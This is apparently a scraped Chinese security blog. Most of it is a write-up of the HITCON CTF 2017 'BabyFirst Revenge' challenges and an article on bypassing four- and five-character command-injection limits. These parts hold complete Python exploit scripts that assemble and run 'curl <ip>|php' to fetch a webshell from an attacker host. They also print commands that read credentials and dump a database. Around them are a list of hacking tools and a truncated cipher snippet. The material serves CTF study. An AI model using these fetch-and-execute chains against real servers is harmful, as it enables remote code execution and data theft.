$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET[\u0026#39;cmd\u0026#39;]) \u0026amp;\u0026amp; strlen($_GET[\u0026#39;cmd\u0026#39;]) \u0026lt;= 5) { @exec($_GET[\u0026#39;cmd\u0026#39;]); } else if (isset($_GET[\u0026#39;reset\u0026#39;])) { @exec(\u0026#39;/bin/rm -rf \u0026#39; . $sandbox); } highlight_file(__FILE__); 解法 详细说明：https://findneo.github.io/171110Bypass4CLimit/\n拿到shell后在/home/fl4444g/README.txt 得到数据库配置信息，然后连接数据库得到flag。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 http://52.199.204.34/sandbox/___MD5___of___ip/shell.php?cmd=cat%20/home/fl4444g/README.txt # Flag is in the MySQL database #fl4444g / SugZXUtgeJ52_Bvr http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e \u0026#34;show databases;\u0026#34; # Database #information_schema #fl4gdb http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e \u0026#34;select concat(table_name) from information_schema.tables where table_schema=\u0026#39;fl4gdb\u0026#39;;\u0026#34; # concat(table_name) #this_is_the_fl4g http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e \u0026#34;use fl4gdb;select * from this_is_the_fl4g\u0026#34; # secret #hitcon{idea_from_phith0n,thank_you:)} EXP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 # by https://findneo.github.io/ import requests as r import hashlib url = \u0026#39;http://52.199.204.34/\u0026#39; # 查询自己的IP ip = r.get(\u0026#39;http://ipv4.icanhazip.com/\u0026#39;).text.strip() sandbox = url + \u0026#39;sandbox/\u0026#39; + hashlib.md5(\u0026#39;orange\u0026#39; + ip).hexdigest() + \u0026#39;/\u0026#39; reset = url + \u0026#39;?reset\u0026#39; cmd = url + \u0026#39;?cmd=\u0026#39; build = [\u0026#39;\u0026gt;cur\\\\\u0026#39;, \u0026#39;\u0026gt;l\\ \\\\\u0026#39;, \u0026#39;ls\u0026gt;A\u0026#39;, \u0026#39;rm c*\u0026#39;, \u0026#39;rm l*\u0026#39;, \u0026#39;\u0026gt;105\\\\\u0026#39;, \u0026#39;\u0026gt;304\\\\\u0026#39;, \u0026#39;\u0026gt;301\\\\\u0026#39;, \u0026#39;\u0026gt;9\\\u0026gt;\\\\\u0026#39;, \u0026#39;ls\u0026gt;\u0026gt;A\u0026#39;, \u0026#39;sh A\u0026#39;, \u0026#39;php A\u0026#39; ] # 如果目标服务器有GET，这个也是可以打的 # build = [\u0026#39;\u0026gt;GE\\\\\u0026#39;, # \u0026#39;\u0026gt;T\\\\ \\\\\u0026#39;, # \u0026#39;ls\u0026gt;A\u0026#39;, # \u0026#39;rm G*\u0026#39;, # \u0026#39;rm T*\u0026#39;, # \u0026#39;\u0026gt;105\\\\\u0026#39;, # \u0026#39;\u0026gt;304\\\\\u0026#39;, # \u0026#39;\u0026gt;301\\\\\u0026#39;, # \u0026#39;\u0026gt;9\\\u0026gt;\\\\\u0026#39;, # \u0026#39;ls\u0026gt;\u0026gt;A\u0026#39;] r.get(reset) for i in build: s = r.get(cmd + i) print \u0026#39;[%s]\u0026#39; % s.status_code, s.url s = r.get(sandbox + \u0026#39;fun.php?cmd=uname -a\u0026#39;) print \u0026#39;\\n\u0026#39; + \u0026#39;[%s]\u0026#39; % s.status_code, s.url print s.text 更多解答 https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge\nBabyFirst Revenge v2 BabyFirst Revenge v2 This is the hardest version! Short enough?\nhttp://52.197.41.31/\n源码 1 2 3 4 5 6 7 8 9 10 \u0026lt;?php $sandbox = \u0026#39;/www/sandbox/\u0026#39; . md5(\u0026#34;orange\u0026#34; . $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET[\u0026#39;cmd\u0026#39;]) \u0026amp;\u0026amp; strlen($_GET[\u0026#39;cmd\u0026#39;]) \u0026lt;= 4) { @exec($_GET[\u0026#39;cmd\u0026#39;]); } else if (isset($_GET[\u0026#39;reset\u0026#39;])) { @exec(\u0026#39;/bin/rm -rf \u0026#39; . $sandbox); } highlight_file(__FILE__); 解法 这题是赛后看wp复现的，只到拿webshell的部分。\n详细说明： https://findneo.github.io/171110Bypass4CLimit/\nEXP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 #-*-coding:utf8-*- # by https://findneo.github.io/ import requests as r from time import sleep import random import hashlib target = \u0026#39;http://52.197.41.31/\u0026#39; # 存放待下载文件的公网主机的IP shell_ip = \u0026#39;xx.xx.xx.xx\u0026#39; # 本机IP your_ip = r.get(\u0026#39;http://ipv4.icanhazip.com/\u0026#39;).text.strip() # 将shell_IP转换成十六进制 ip = \u0026#39;0x\u0026#39; + \u0026#39;\u0026#39;.join([str(hex(int(i))[2:].zfill(2)) for i in shell_ip.split(\u0026#39;.\u0026#39;)]) reset = target + \u0026#39;?reset\u0026#39; cmd = target + \u0026#39;?cmd=\u0026#39; sandbox = target + \u0026#39;sandbox/\u0026#39; + \\ hashlib.md5(\u0026#39;orange\u0026#39; + your_ip).hexdigest() + \u0026#39;/\u0026#39; # payload某些位置的可选字符 pos0 = random.choice(\u0026#39;efgh\u0026#39;) pos1 = random.choice(\u0026#39;hkpq\u0026#39;) pos2 = \u0026#39;g\u0026#39; # 随意选择字符 payload = [ \u0026#39;\u0026gt;dir\u0026#39;, # 创建名为 dir 的文件 \u0026#39;\u0026gt;%s\\\u0026gt;\u0026#39; % pos0, # 假设pos0选择 f , 创建名为 f\u0026gt; 的文件 \u0026#39;\u0026gt;%st-\u0026#39; % pos1, # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1， # 因为alphabetical序中t\u0026gt;s \u0026#39;\u0026gt;sl\u0026#39;, # 创建名为 \u0026gt;sl 的文件；到此处有四个文件， # ls 的结果会是：dir f\u0026gt; kt- sl \u0026#39;*\u0026gt;v\u0026#39;, # * 相当于 `ls` ，那么这条命令等价于 `dir f\u0026gt; kt- sl`\u0026gt;v ， # dir是不换行的，所以这时会创建文件 v 并写入 f\u0026gt; kt- sl # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符 \u0026#39;\u0026gt;rev\u0026#39;, # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f\u0026gt; kt- rev sl v \u0026#39;*v\u0026gt;%s\u0026#39; % pos2, # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。体会一下。 # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk \u0026gt; f # 续行分割 curl 0x11223344|php 并逆序写入 \u0026#39;\u0026gt;p\u0026#39;, \u0026#39;\u0026gt;ph\\\\\u0026#39;, \u0026#39;\u0026gt;\\|\\\\\u0026#39;, \u0026#39;\u0026gt;%s\\\\\u0026#39; % ip[8:10], \u0026#39;\u0026gt;%s\\\\\u0026#39; % ip[6:8], \u0026#39;\u0026gt;%s\\\\\u0026#39; % ip[4:6], \u0026#39;\u0026gt;%s\\\\\u0026#39; % ip[2:4], \u0026#39;\u0026gt;%s\\\\\u0026#39; % ip[0:2], \u0026#39;\u0026gt;\\ \\\\\u0026#39;, \u0026#39;\u0026gt;rl\\\\\u0026#39;, \u0026#39;\u0026gt;cu\\\\\u0026#39;, \u0026#39;sh \u0026#39; + pos2, # sh g ;g 的内容是 ls -tk \u0026gt; f ，那么就会把逆序的命令反转回来， # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行 \u0026#39;sh \u0026#39; + pos0, # sh f 执行curl命令，下载文件，写入木马。 ] s = r.get(reset) for i in payload: assert len(i) \u0026lt;= 4 s = r.get(cmd + i) print \u0026#39;[%d]\u0026#39; % s.status_code, s.url sleep(0.1) s = r.get(sandbox + \u0026#39;fun.php?cmd=uname -a\u0026#39;) print \u0026#39;[%d]\u0026#39; % s.status_code, s.url print s.text 更多解答 https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2\n参考链接 来自小密圈里的那些奇技淫巧\n","permalink":"https://ret2neo.cn/post/171112hitconctfbabyfirstrevengeserieswp/","summary":"from HITCON CTF 2017 2017/11/04 02:00 UTC ~ 2017/11/06 02:00 UTC\nhttps://ctf2017.hitcon.org/\nBabyFirst Revenge Do you remember BabyFirst from HITCON CTF 2015?\nThis is the harder version!\nhttp://52.199.204.34/\n源码 1 2 3 4 5 6 7 8 9 10 \u0026lt;?php $sandbox = \u0026#39;/www/sandbox/\u0026#39; . md5(\u0026#34;orange\u0026#34; . $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET[\u0026#39;cmd\u0026#39;]) \u0026amp;\u0026amp; strlen($_GET[\u0026#39;cmd\u0026#39;]) \u0026lt;= 5) { @exec($_GET[\u0026#39;cmd\u0026#39;]); } else if (isset($_GET[\u0026#39;reset\u0026#39;])) { @exec(\u0026#39;/bin/rm -rf \u0026#39; . $sandbox); } highlight_file(__FILE__); 解法 详细说明：https://findneo.","title":"HITCON CTF 2017 BabyFirst Revenge and v2 writeup"},{"content":" 本文首发于安全客 (https://www.anquanke.com/post/id/87203)\n前言 本文主要整理如何巧用Linux命令绕过命令注入点的字符数量限制，内容围绕HITCON CTF 2017 的两道题展开，先讲五个字符的限制，再讲四个字符的。在此感谢下主办方分享这么有趣的点子。\n热身 问题的起源是 HITCON CTF 2017 的 BabyFirst Revenge 题，题目的主要代码如下：\n1 2 3 4 5 6 7 8 9 10 11 BabyFirst Revenge \u0026lt;?php $sandbox = \u0026#39;/www/sandbox/\u0026#39; . md5(\u0026#34;orange\u0026#34; . $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET[\u0026#39;cmd\u0026#39;]) \u0026amp;\u0026amp; strlen($_GET[\u0026#39;cmd\u0026#39;]) \u0026lt;= 5) { @exec($_GET[\u0026#39;cmd\u0026#39;]); } else if (isset($_GET[\u0026#39;reset\u0026#39;])) { @exec(\u0026#39;/bin/rm -rf \u0026#39; . $sandbox); } highlight_file(__FILE__); 冷静分析 目标环境根据每个访问者的IP为其在sandbox里新建一个文件夹并作为其工作目录，接受并执行访问者提交的命令。访问者可随时通过提交reset来重置环境。这是个有限制无回显的后门，命令长度要求小于等于5 ，我们会希望利用这一点撕开口子，往服务器上写一个自己的木马，从而扩大命令执行范围。\n我们所面临的最主要问题是能够执行的命令长度太短，因此考虑把命令写进文件里再执行，命令的功能是下载我们指定的文件。\n在此之前，先做些知识铺垫。\nIP的等价表示法 IP地址本质上就是一个整数，只是通常用点分十进制表示，以至于我们反而不太熟悉它本来的样子。只要必要，我们可以用十六进制、长整数、八进制表示IP，大部分情况下效果是相同的。\n它们之间的转换也很方便：\n1 2 3 4 5 6 7 8 9 10 ip = \u0026#39;127.0.0.1\u0026#39; # 十六进制 print \u0026#39;0x\u0026#39; + \u0026#39;\u0026#39;.join([str(hex(int(i))[2:].zfill(2)) for i in ip.split(\u0026#39;.\u0026#39;)]) # 长整数 print int(\u0026#39;\u0026#39;.join([str(hex(int(i))[2:].zfill(2)) for i in ip.split(\u0026#39;.\u0026#39;)]), 16) # 八进制 print \u0026#39;0\u0026#39; + oct(int(\u0026#39;\u0026#39;.join([str(hex(int(i))[2:].zfill(2)) for i in ip.split(\u0026#39;.\u0026#39;)]), 16)) 从网络下载文件 利用续行符拆分命令成多行 用两个字符在Linux下创建文件 将命令执行结果重定向到文件 利用重定向向文件追加内容 删除文件 ls 的文件排列顺序 一句alphabetical耐人寻味，不过大致顺序就是如下图所示。\n开始表演 假设我有一台目标服务器能够访问到的公网主机，为了方便我把该主机IP转换成长整数，然后利用以上的知识将 curl ip \u0026gt; A 用续行方式切割成多行写进文件 A ，然后执行 sh A 就可以下载到预先放在公网主机上的文件并且覆盖本地的文件A，而下载下来的文件内容是用来写PHP木马的PHP代码，我再执行 php A就可以写个自己的webshell进去啦。\n这里比较取巧的是我的公网IP转成长整形恰好能分割成顺序的四段，如果构造不出来，可以试试十六进制，八进制，找台能用的主机等等：）或者继续往下看，还会有其他办法。\n另外，其实GET也是能用的，只是目标主机里没有安装所以这题不能用。\n接下来让我们完成最后30%的工作，写个exp。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 # -*- coding:utf8 -*- import requests as r import hashlib url = \u0026#39;http://52.199.204.34/\u0026#39; # 查询自己的IP ip = r.get(\u0026#39;http://ipv4.icanhazip.com/\u0026#39;).text.strip() sandbox = url + \u0026#39;sandbox/\u0026#39; + hashlib.md5(\u0026#39;orange\u0026#39; + ip).hexdigest() + \u0026#39;/\u0026#39; reset = url + \u0026#39;?reset\u0026#39; cmd = url + \u0026#39;?cmd=\u0026#39; build = [\u0026#39;\u0026gt;cur\\\u0026#39;, \u0026#39;\u0026gt;l \\\u0026#39;, \u0026#39;ls\u0026gt;A\u0026#39;, \u0026#39;rm c*\u0026#39;, \u0026#39;rm l*\u0026#39;, \u0026#39;\u0026gt;105\\\u0026#39;, \u0026#39;\u0026gt;304\\\u0026#39;, \u0026#39;\u0026gt;301\\\u0026#39;, \u0026#39;\u0026gt;9\u0026gt;\\\u0026#39;, \u0026#39;ls\u0026gt;\u0026gt;A\u0026#39;, \u0026#39;sh A\u0026#39;, \u0026#39;php A\u0026#39; ] # 如果目标服务器有GET，这个也是可以打的 # build = [\u0026#39;\u0026gt;GE\\\u0026#39;, # \u0026#39;\u0026gt;T\\ \\\u0026#39;, # \u0026#39;ls\u0026gt;A\u0026#39;, # \u0026#39;rm G*\u0026#39;, # \u0026#39;rm T*\u0026#39;, # \u0026#39;\u0026gt;105\\\u0026#39;, # \u0026#39;\u0026gt;304\\\u0026#39;, # \u0026#39;\u0026gt;301\\\u0026#39;, # \u0026#39;\u0026gt;9\u0026gt;\\\u0026#39;, # \u0026#39;ls\u0026gt;\u0026gt;A\u0026#39;] r.get(reset) for i in build: s = r.get(cmd + i) print \u0026#39;[%s]\u0026#39; % s.status_code, s.url s = r.get(sandbox + \u0026#39;fun.php?cmd=uname -a\u0026#39;) print \u0026#39;n\u0026#39; + \u0026#39;[%s]\u0026#39; % s.status_code, s.url print s.text 运行效果 挑战升级 这篇文章有趣的地方才刚刚开始。\n代码只改了一个字符，但趣味已经不在一个量级。一脸懵逼的我看了大佬们的wp后兴奋不已。\nBabyFirst Revenge v2：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php $sandbox = \u0026#39;/www/sandbox/\u0026#39; . md5(\u0026#34;orange\u0026#34; . $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]) @mkdir($sandbox) @chdir($sandbox) if (isset($_GET[\u0026#39;cmd\u0026#39;]) \u0026amp; \u0026amp; strlen($_GET[\u0026#39;cmd\u0026#39;]) \u0026lt;= 4) { @exec($_GET[\u0026#39;cmd\u0026#39;]) } else if (isset($_GET[\u0026#39;reset\u0026#39;])) { @exec(\u0026#39;/bin/rm -rf \u0026#39; . $sandbox) } highlight_file(__FILE__) 热烈分析 只有四个字符的施展空间意味着我们能做的事情少之又少，但Linux本身的简洁给了我们机会。\n突破之旅从神奇的星号 * 开始。\n经过简单测试我们猜测 * 的作用相当于 ls 。这其实相当厉害，我们本就基本上可以创建任意名字的短文件，现在又可以一个字符就把这些文件名连起来当作命令执行，这提供了很大的想象空间。\n还有本质上一样但现象很有趣的，待会儿会用到：\n虽然这些特技提供了一些可能性，但是 ls 列出的文件顺序问题仍然是个挑战，我们很难在 alphabetical 序的基础上构造出有用的命令。\n写入时间是我们可以控制的，如果能执行 ls –t（将文件按时间排序输出），那么只要把想执行的命令分割成若干段然后逆序写入，就可以随心所欲地构造出任意命令。考虑到 ls -t 本身就已经有4个字符了，我们故技重施，先将 ls -t \u0026gt; f 写入文件 g 中，然后执行 sh g 即可将我们分段逆序写入的命令拼接起来。\n在开始操作前，再介绍两个会用到的命令：dir 和 rev。\ndir 在GNU文档中有下图这样的描述：\n虽然基本上和 ls 一样，但有两个好处，一是开头字母是d ，这使得它在 alphabetical 序中靠前，二是按列输出，不换行。\nrev 这个前面出场过，可以反转文件每一行的内容。\n实验一下：\n开始挑战 需要知道的命令和 tips 都已经介绍了，下面是代码和解释：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 #-*-coding:utf8-*- import requests as r from time import sleep import random import hashlib target = \u0026#39;http://52.197.41.31/\u0026#39; # 存放待下载文件的公网主机的IP shell_ip = \u0026#39;xx.xx.xx.xx\u0026#39; # 本机IP your_ip = r.get(\u0026#39;http://ipv4.icanhazip.com/\u0026#39;).text.strip() # 将shell_IP转换成十六进制 ip = \u0026#39;0x\u0026#39; + \u0026#39;\u0026#39;.join([str(hex(int(i))[2:].zfill(2)) for i in shell_ip.split(\u0026#39;.\u0026#39;)]) reset = target + \u0026#39;?reset\u0026#39; cmd = target + \u0026#39;?cmd=\u0026#39; sandbox = target + \u0026#39;sandbox/\u0026#39; + hashlib.md5(\u0026#39;orange\u0026#39; + your_ip).hexdigest() + \u0026#39;/\u0026#39; # payload某些位置的可选字符 pos0 = random.choice(\u0026#39;efgh\u0026#39;) pos1 = random.choice(\u0026#39;hkpq\u0026#39;) pos2 = \u0026#39;g\u0026#39; # 随意选择字符 payload = [ \u0026#39;\u0026gt;dir\u0026#39;, # 创建名为 dir 的文件 \u0026#39;\u0026gt;%s\u0026gt;\u0026#39; % pos0, # 假设pos0选择 f , 创建名为 f\u0026gt; 的文件 \u0026#39;\u0026gt;%st-\u0026#39; % pos1, # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1， # 因为alphabetical序中t\u0026gt;s \u0026#39;\u0026gt;sl\u0026#39;, # 创建名为 \u0026gt;sl 的文件；到此处有四个文件， # ls 的结果会是：dir f\u0026gt; kt- sl \u0026#39;*\u0026gt;v\u0026#39;, # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f\u0026gt; kt- sl`\u0026gt;v ， # 前面提到dir是不换行的，所以这时会创建文件 v 并写入 f\u0026gt; kt- sl # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符 \u0026#39;\u0026gt;rev\u0026#39;, # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f\u0026gt; kt- rev sl v \u0026#39;*v\u0026gt;%s\u0026#39; % pos2, # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。 # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk \u0026gt; f # 续行分割 curl 0x11223344|php 并逆序写入 \u0026#39;\u0026gt;p\u0026#39;, \u0026#39;\u0026gt;ph\\\u0026#39;, \u0026#39;\u0026gt;|\\\u0026#39;, \u0026#39;\u0026gt;%s\\\u0026#39; % ip[8:10], \u0026#39;\u0026gt;%s\\\u0026#39; % ip[6:8], \u0026#39;\u0026gt;%s\\\u0026#39; % ip[4:6], \u0026#39;\u0026gt;%s\\\u0026#39; % ip[2:4], \u0026#39;\u0026gt;%s\\\u0026#39; % ip[0:2], \u0026#39;\u0026gt; \\\u0026#39;, \u0026#39;\u0026gt;rl\\\u0026#39;, \u0026#39;\u0026gt;cu\\\u0026#39;, \u0026#39;sh \u0026#39; + pos2, # sh g ;g 的内容是 ls -tk \u0026gt; f ，那么就会把逆序的命令反转回来， # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行 \u0026#39;sh \u0026#39; + pos0, # sh f 执行curl命令，下载文件，写入木马。 ] s = r.get(reset) for i in payload: assert len(i) \u0026lt;= 4 s = r.get(cmd + i) print \u0026#39;[%d]\u0026#39; % s.status_code, s.url sleep(0.1) s = r.get(sandbox + \u0026#39;fun.php?cmd=uname -a\u0026#39;) print \u0026#39;[%d]\u0026#39; % s.status_code, s.url print s.text 运行效果 后记 我相信除了文中给出的方法外一定还有一些奇招，大家可以多多探索，可以围观HITCON CTF 2107的官方解答区，还可以学习下Phithon师傅的《小密圈里的那些奇技淫巧》 中与本文主题相关的部分。\n最后，如果关于文章内容有任何建议或疑惑，你可以在https://findneo.github.io/ 联系本文作者。感谢阅读o/\n本文由安全客原创发布 如若转载，请注明出处： https://www.anquanke.com/post/id/87203\n安全客 - 有思想的安全新媒体\n","permalink":"https://ret2neo.cn/post/171110bypass4climit/","summary":"本文首发于安全客 (https://www.anquanke.com/post/id/87203)\n前言 本文主要整理如何巧用Linux命令绕过命令注入点的字符数量限制，内容围绕HITCON CTF 2017 的两道题展开，先讲五个字符的限制，再讲四个字符的。在此感谢下主办方分享这么有趣的点子。\n热身 问题的起源是 HITCON CTF 2017 的 BabyFirst Revenge 题，题目的主要代码如下：\n1 2 3 4 5 6 7 8 9 10 11 BabyFirst Revenge \u0026lt;?php $sandbox = \u0026#39;/www/sandbox/\u0026#39; . md5(\u0026#34;orange\u0026#34; . $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET[\u0026#39;cmd\u0026#39;]) \u0026amp;\u0026amp; strlen($_GET[\u0026#39;cmd\u0026#39;]) \u0026lt;= 5) { @exec($_GET[\u0026#39;cmd\u0026#39;]); } else if (isset($_GET[\u0026#39;reset\u0026#39;])) { @exec(\u0026#39;/bin/rm -rf \u0026#39; . $sandbox); } highlight_file(__FILE__); 冷静分析 目标环境根据每个访问者的IP为其在sandbox里新建一个文件夹并作为其工作目录，接受并执行访问者提交的命令。访问者可随时通过提交reset来重置环境。这是个有限制无回显的后门，命令长度要求小于等于5 ，我们会希望利用这一点撕开口子，往服务器上写一个自己的木马，从而扩大命令执行范围。\n我们所面临的最主要问题是能够执行的命令长度太短，因此考虑把命令写进文件里再执行，命令的功能是下载我们指定的文件。\n在此之前，先做些知识铺垫。\nIP的等价表示法 IP地址本质上就是一个整数，只是通常用点分十进制表示，以至于我们反而不太熟悉它本来的样子。只要必要，我们可以用十六进制、长整数、八进制表示IP，大部分情况下效果是相同的。\n它们之间的转换也很方便：\n1 2 3 4 5 6 7 8 9 10 ip = \u0026#39;127.","title":"如何绕过四个字符限制getshell"},{"content":" https://github.com/findneo/computerTools\n系统优化类 everything 本地文件全盘搜索。\nagentransack 本地文档全文搜索。\nfilelocator 付费版本地文档全文搜索。\nnotepad++ 轻量却强大的文本编辑器，支持插件扩展和很多自定义项。\n​\t插件推荐：\nmarkdownviewer++ 预览md文件 php autocompletion emmet Resilio Sync 就像，不限容，不限速，无审查的云盘 。\nteleport ultra 全站克隆到本地 。\niobitUninstaller 程序彻底卸载。\n迅雷极速版7.10.34.360 存粹的下载器。\nshadowsocks 代理工具，更方便地访问互联网。\nsplayer 本地视音频播放器，无广告，可自动搜索影片字幕。已停更。\npotplayer 强大的影音播放器。\nf.lux 自动调节电脑屏幕色温，保护视力。win10创意者更新中已集成到系统 。\n护眼啦 定时提醒休息。高于1.6的某些版本会报毒。可自行谷歌 或 百度 下载低版本。\neyerest ubuntu下的护眼工具。\nfoxmail邮箱客户端，RSS功能也不错。\n加加输入法 文明和谐的输入法。\n7zip 开源免费无广告的压缩工具。\nwin10锁屏壁纸所在文件夹(C:\\Users\\\\++username++\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\Assets) 谷歌浏览器 中文版,英文版\n插件推荐：\noctotree github目录树查看。 adblock 拦截广告 印象笔记 cookiesmanager shodan listen1集成多平台歌源，下载压缩包并解压后以chrome开发者模式加载 tamperMonkey 有道取词1.4 更多脚本 火狐浏览器\n插件推荐：\n印象笔记 GreasyMonkey 有道取词1.4 更多脚本 Hack Bar firebug uBlock Origin Bookmark Dedulplicator add to wunderlist Tamper Data拦截修改 Modify Headers修改头部 AutoProxy NoScript Live Http Header markdown相关:\n马克飞象 markdownPad2 右侧即时预览的markdown编辑器 typora 所见即所得的markdown编辑器 文件同步：\nallwaysync 坚果云 dopdf 其他格式文件转pdf，效果不错。\ntelegram 即时通讯工具，被墙。\nWPS Office 2013 个人版\n学习相关类 印象笔记\nsumatraPdf 小巧好用的PDF阅读器，已停更。\n福昕(xin)pdf阅读器\nfreemind 开源的思维导图工具。\ngoldenDict 离线词典。\ntodotxt，纯文本GTD工具。\ncalibre 书籍管理，azw阅读器很棒 。\nmyBase 知识管理。\nzeal 离线文档查询。\nCisco Packet Tracer Student，路由模拟器。\nGNS3 数据通信模拟器。\n开发相关类 visual studio code\nsublimeText 功能齐全，好看。\n插件HTML-CSS-JS Prettify jedi ：python自动补全 anaconda Localization汉化 ConvertToUTF8解决编码问题 Bracket Highlighter匹配括号，引号和html标签。 DocBlockr　自动生成PHPDoc风格的注释。支持的js, PHP, ActionScript, CoffeeScript, Java, Objective C, C, C++ Emmet(Zen Coding)　快速生成HTML代码段的插件,很强大。比如试试html:4s 其它相关 https://github.com/jikeytang/sublime-text devcpp\nwing IDE python 集成开发环境\ngit 版本管理\n远程管理\nMobaXterm 强大，方便，好看。 winscp real VNC xshell secureCRT putty teamviewer weevely 中国菜刀 本地环境搭建\nwamp phpstudy source insight\nmatlab\njre/jdk\npython/anaconda\nwsl\nlinux\nfish shell zsh shell 安全类 winhex\n010editor\nzip压缩文件爆破\nadvanced zip password recovery ziperello 御剑\nawvs\nnmap\nsqlmap\nburpsuite\nwireshark\nfiddler\nOD\nIDAPRO\nOWASP Mantra Janus\nMoC en 0.3 Alpha\nseay代码审计系统\nvirtual box开源的虚拟机软件，内存占用较小\nvmware\nkali backtrack 52pojie虚拟机 xampp+dvwa Metasploitable-linux OWASP_Broken_Web_Apps_VM SEEDUbuntu web for pentester WebGoat-OWASP_standard_win32 小工具 微软的签名检查命令行工具sigcheck 微软的命令行校验工具fciv HXD十六进制编辑器 截图工具snipaste 硬件信息检测CPU-Z 好的在线工具 markdown协作 文本共享 ","permalink":"https://ret2neo.cn/post/171103computertools/","summary":"https://github.com/findneo/computerTools\n系统优化类 everything 本地文件全盘搜索。\nagentransack 本地文档全文搜索。\nfilelocator 付费版本地文档全文搜索。\nnotepad++ 轻量却强大的文本编辑器，支持插件扩展和很多自定义项。\n​\t插件推荐：\nmarkdownviewer++ 预览md文件 php autocompletion emmet Resilio Sync 就像，不限容，不限速，无审查的云盘 。\nteleport ultra 全站克隆到本地 。\niobitUninstaller 程序彻底卸载。\n迅雷极速版7.10.34.360 存粹的下载器。\nshadowsocks 代理工具，更方便地访问互联网。\nsplayer 本地视音频播放器，无广告，可自动搜索影片字幕。已停更。\npotplayer 强大的影音播放器。\nf.lux 自动调节电脑屏幕色温，保护视力。win10创意者更新中已集成到系统 。\n护眼啦 定时提醒休息。高于1.6的某些版本会报毒。可自行谷歌 或 百度 下载低版本。\neyerest ubuntu下的护眼工具。\nfoxmail邮箱客户端，RSS功能也不错。\n加加输入法 文明和谐的输入法。\n7zip 开源免费无广告的压缩工具。\nwin10锁屏壁纸所在文件夹(C:\\Users\\\\++username++\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\Assets) 谷歌浏览器 中文版,英文版\n插件推荐：\noctotree github目录树查看。 adblock 拦截广告 印象笔记 cookiesmanager shodan listen1集成多平台歌源，下载压缩包并解压后以chrome开发者模式加载 tamperMonkey 有道取词1.4 更多脚本 火狐浏览器\n插件推荐：\n印象笔记 GreasyMonkey 有道取词1.","title":"利器"},{"content":"栅栏密码加解密 单行版本 1 2 railFence = lambda s: [[i, \u0026#39;\u0026#39;.join([s[k * i + j] for j in range(i) for k in range(len(s) / i)])] for i in range(1, len(s)) if not len(s) % i] print railFence(\u0026#39;hello world , 2017 ! \u0026#39;) 正常版本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def railFence(s): ll = len(s) res = dict() for i in range(1, ll): r = \u0026#39;\u0026#39; if ll % i == 0: for j in range(i): for k in range(ll / i): r += s[k * i + j] res[i] = r return res # test print railFence(\u0026#39;hello world , 2017 ! \u0026#39;) # {1: \u0026#39;hello world , 2017 ! \u0026#39;, 3: \u0026#39;hlwl,0 eood 1!l r 27 \u0026#39;, 7: \u0026#39;ho2er0ll1ld7o ,!w \u0026#39;} 凯撒密码加解密 单行版本 1 2 def caesar(s): return [[off, \u0026#39;\u0026#39;.join([chr((ord(i) - 97 + off) % 26 + 97) if \u0026#39;a\u0026#39; \u0026lt;= i \u0026lt;= \u0026#39;z\u0026#39; else chr((ord(i) - 65 + off) % 26 + 65) if \u0026#39;A\u0026#39; \u0026lt;= i \u0026lt;= \u0026#39;Z\u0026#39; else i for i in str(s)])] for off in range(26)] print caesar(\u0026#39;h3llo\u0026#39;) 正常版本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 def caesar(s): cycle = 26 res = [] for offset in range(26): r = \u0026#39;\u0026#39; for i in str(s): if \u0026#39;a\u0026#39; \u0026lt;= i \u0026lt;= \u0026#39;z\u0026#39;: r += chr((ord(i) - 